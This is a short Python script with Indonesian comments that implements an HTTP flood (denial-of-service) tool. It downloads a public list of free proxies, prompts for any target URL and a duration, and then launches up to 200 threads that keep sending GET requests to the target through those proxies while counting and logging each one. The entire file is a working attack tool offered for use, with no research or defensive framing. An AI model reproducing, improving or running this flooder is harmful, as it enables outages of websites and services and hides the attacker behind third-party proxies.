#!/usr/bin/env python3
"""
🔥 FLOOD LANGSUNG SEMUA PROXY — TANPA RANDOM SAMPLING
- Log error detail
- HANYA UNTUK PROXY HTTP (bukan SOCKS5!)
"""

import socket
import threading
import time
import random
import urllib.request
import sys
from urllib.parse import urlparse

# 🔗 Ganti ke daftar PROXY HTTP/HTTPS, BUKAN SOCKS5!
# Contoh bagus: https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt
GITHUB_PROXY_URL = "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt"  # ❌ INI SALAH!

# 🎭 Custom UA
CUSTOM_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "CustomBot/1.0"
]

PATHS = ["/"]

request_count = 0
lock = threading.Lock()

def log(msg):
    with lock:
        print(f"[{time.strftime('%H:%M:%S')}] {msg}")

def load_proxies():
    try:
        log("📥 Unduh proxy...")
        with urllib.request.urlopen(GITHUB_PROXY_URL, timeout=10) as r:
            proxies = [line.strip() for line in r.read().decode().splitlines() if line.strip() and ":" in line]
        log(f"✅ Muat {len(proxies)} proxy.")
        return proxies
    except Exception as e:
        log(f"❌ Gagal: {e}")
        sys.exit(1)

def flood_http(proxy, host, port, duration):
    global request_count
    try:
        proxy_host, proxy_port = proxy.split(":", 1)
        proxy_port = int(proxy_port)
    except Exception as e:
        log(f"❌ Format proxy error [{proxy}]: {e}")
        return

    end = time.time() + duration
    while time.time() < end:
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((proxy_host, proxy_port))
            req = f"GET http://{host}:{port}/ HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
            s.send(req.encode())
            s.recv(1024)
            s.close()

            with lock:
                request_count += 1
                log(f"📤 {proxy_host} → Paket #{request_count}")
        except Exception as e:
            log(f"❌ {proxy_host} → Gagal: {str(e)[:50]}")

def main():
    print("🚀 FLOOD - LANGSUNG GAS SEMUA PROXY")
    target = input("Target (http://): ").strip()
    if not target.startswith("http://"):
        target = "http://" + target

    parsed = urlparse(target)
    if not parsed.hostname:
        print("❌ URL salah!")
        return

    host, port = parsed.hostname, parsed.port or 80
    duration = int(input("Durasi (detik): ") or "30")

    proxies = load_proxies()
    if not proxies:
        return

    log(f"🎯 Target: {host}:{port} | Proxy: {len(proxies)}")

    # 🔥 BATASI TOTAL THREAD — jangan lebih dari 200!
    MAX_THREADS = min(200, len(proxies))
    log(f"🌀 Jalankan {MAX_THREADS} thread...")

    threads = []
    for proxy in proxies[:MAX_THREADS]:  # ambil maks 200
        t = threading.Thread(target=flood_http, args=(proxy, host, port, duration))
        t.daemon = True
        threads.append(t)
        t.start()

    try:
        time.sleep(duration)
        log(f"✅ Selesai. Total: {request_count}")
    except KeyboardInterrupt:
        log("🛑 Stop.")

if __name__ == "__main__":
    main()
